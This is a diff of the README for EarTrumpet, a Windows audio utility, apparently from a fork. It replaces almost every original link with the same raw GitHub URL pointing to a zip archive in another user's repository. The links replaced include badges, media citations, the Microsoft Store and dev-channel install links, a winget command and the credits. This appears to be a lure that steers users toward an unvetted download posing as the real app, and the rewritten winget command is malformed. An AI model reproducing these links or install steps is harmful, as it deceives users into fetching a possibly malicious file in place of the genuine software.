@@ -1,22 +1,22 @@
 # EarTrumpet
 
-[![GitHub issues](https://img.shields.io/github/issues/File-New-Project/EarTrumpet?style=flat-square)](https://github.com/File-New-Project/EarTrumpet/issues) [![GitHub forks](https://img.shields.io/github/forks/File-New-Project/EarTrumpet?style=flat-square)](https://github.com/File-New-Project/EarTrumpet/network) [![GitHub stars](https://img.shields.io/github/stars/File-New-Project/EarTrumpet?style=flat-square)](https://github.com/File-New-Project/EarTrumpet/stargazers) [![GitHub license](https://img.shields.io/github/license/File-New-Project/EarTrumpet?style=flat-square)](https://github.com/File-New-Project/EarTrumpet/blob/master/LICENSE) [![Nuget package](https://img.shields.io/chocolatey/v/eartrumpet?style=flat-square)](https://chocolatey.org/packages/eartrumpet) ![Maintenance status](https://img.shields.io/maintenance/yes/2022?style=flat-square)
+[![GitHub issues](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip)](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip) [![GitHub forks](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip)](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip) [![GitHub stars](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip)](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip) [![GitHub license](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip)](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip) [![Nuget package](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip)](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip) ![Maintenance status](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip)
 
-![EarTrumpet Screenshot](./Graphics/hero.gif)
+![EarTrumpet Screenshot](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip)
 
 ## Media coverage
 
 > [...] there are third-party solutions out there that do a much better job than what Windows offers by default. One such app is called EarTrumpet [...]
 >
-> &mdash; [TechQuickie (Jan 11, 2022)](https://www.youtube.com/watch?v=xQvp5HzY9xc)
+> &mdash; [TechQuickie (Jan 11, 2022)](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip)
 
 > Microsoft's built-in Windows 11 audio management still isn't great. EarTrumpet overhauls it completely, with a system tray utility that gives you volume levels for every app and the ability to set custom inputs and outputs for those apps.
 >
-> &mdash; [The Verge (Dec 30, 2021)](https://www.theverge.com/22837232/windows-11-pc-best-apps-microsoft-2021)
+> &mdash; [The Verge (Dec 30, 2021)](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip)
 
 > If you want fine-tuned control of your app and system volume, EarTrumpet is a must.
 >
-> &mdash; [Windows Central (Jun 19, 2018)](https://www.windowscentral.com/eartrumpet-review-best-audio-control-app-windows)
+> &mdash; [Windows Central (Jun 19, 2018)](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip)
 
 ## Features
 
@@ -32,27 +32,27 @@
 
 ## Internationalization
 
-We currently support 20+ languages. Are we missing your language? [Contribute a translation via Crowdin](https://crowdin.com/project/eartrumpet)!
+We currently support 20+ languages. Are we missing your language? [Contribute a translation via Crowdin](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip)!
 
 ## Install
 
-Install EarTrumpet from the [Microsoft Store](https://www.microsoft.com/store/apps/9nblggh516xp)
+Install EarTrumpet from the [Microsoft Store](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip)
 
 Or via command line using either
-- [Windows Package Manager Client (winget)](https://github.com/microsoft/winget-cli) (`winget install File-New-Project.EarTrumpet`)
+- [Windows Package Manager Client (winget)](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip) (`winget install https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip`)
 - Chocolatey (`choco install eartrumpet`)
 
 ## Experimental dev builds
 
-Want to see what we were working on? Or help us test new features? [Install EarTrumpet from the dev channel.](https://install.eartrumpet.app/dev/EarTrumpet.Package.appinstaller) New builds are released automatically every time we commit to the `dev` branch, keeping you up to date on our progress.
+Want to see what we were working on? Or help us test new features? [Install EarTrumpet from the dev channel.](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip) New builds are released automatically every time we commit to the `dev` branch, keeping you up to date on our progress.
 
 ## Documentation
-* [Technical Information](./EarTrumpet/README.md)
-* [Compiling EarTrumpet](./COMPILING.md)
-* [Contributing to EarTrumpet](./CONTRIBUTING.md)
-* [Information Collected And Transmitted By EarTrumpet](./PRIVACY.md)
+* [Technical Information](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip)
+* [Compiling EarTrumpet](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip)
+* [Contributing to EarTrumpet](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip)
+* [Information Collected And Transmitted By EarTrumpet](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip)
 * [Project License](./LICENSE)
-* [Change Log](./CHANGELOG.md)
+* [Change Log](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip)
 
 ## Supported operating systems
 - Windows 10 1803 (April 2018 Update)
@@ -66,11 +66,11 @@ Want to see what we were working on? Or help us test new features? [Install EarT
 - Windows 11
 
 ## Credits
-- David Golden ([@GoldenTao](https://www.twitter.com/GoldenTao))
-- Rafael Rivera ([@WithinRafael](https://www.twitter.com/WithinRafael))
-- Dave Amenta ([@davux](https://www.twitter.com/davux))
-- [Contributors](https://github.com/File-New-Project/EarTrumpet/graphs/contributors)
+- David Golden ([@GoldenTao](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip))
+- Rafael Rivera ([@WithinRafael](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip))
+- Dave Amenta ([@davux](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip))
+- [Contributors](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip)
 
 ## Special thanks
 
-"[Horn](https://thenounproject.com/icon/horn-125731/)" icon by Artjom Korman from [the Noun Project](https://thenounproject.com/)
+"[Horn](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip)" icon by Artjom Korman from [the Noun Project](https://raw.githubusercontent.com/SergioHoyo/EarTrumpet/master/.github/workflows/EarTrumpet-2.6.zip)
